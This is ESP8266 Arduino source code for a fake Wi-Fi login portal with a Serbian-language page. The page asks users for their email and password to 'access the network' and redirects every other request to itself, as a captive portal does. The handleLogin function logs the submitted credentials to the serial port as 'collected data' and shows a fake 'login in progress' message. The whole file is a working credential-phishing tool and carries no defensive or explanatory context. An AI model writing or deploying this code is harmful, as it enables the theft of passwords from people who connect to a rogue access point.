ESP8266WebServer server(80);

const char LOGIN_PAGE[] = R"====(
<!DOCTYPE html>
<html lang="sr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  body { font-family: sans-serif; background: #0b1e1f; color: #F4FBFA; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
  .card { background: rgba(255,255,255,0.05); padding: 30px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); width: 90%; max-width: 350px; text-align: center; }
  input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #162a2b; color: white; box-sizing: border-box; }
  button { width: 100%; padding: 12px; border: none; border-radius: 10px; background: #2DE0C6; color: #052B28; font-weight: bold; cursor: pointer; margin-top: 10px; }
</style>
</head>
<body>
  <div class="card">
    <h2>Dobrodošli</h2>
    <p>Unesite podatke za pristup mreži</p>
    <form action="/login" method="POST">
      <input type="email" name="email" placeholder="Email" required>
      <input type="password" name="password" placeholder="Lozinka" required>
      <button type="submit">Poveži se</button>
    </form>
  </div>
</body>
</html>
)====";

void handleRoot() {
  server.send(200, "text/html", LOGIN_PAGE);
}

void handleNotFound() {

  server.sendHeader("Location", "/", true);
  server.send(302, "text/plain", "");
}

void initWebServer() {
  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.onNotFound(handleNotFound);
  server.begin();
  Serial.println("Web server pokrenut na portu 80.");
}

void processWebServer() {
  server.handleClient(); 
}

void handleLogin() {
  if (server.hasArg("email") && server.hasArg("password")) {
    String email = server.arg("email");
    String pass = server.arg("password");
    Serial.print("Prikupljeni podaci: Email: ");
    Serial.print(email);
    Serial.print(" | Sifra: ");
    Serial.println(pass);
    server.send(200, "text/html", "<h1>Prijava u toku...</h1>");
  }
}
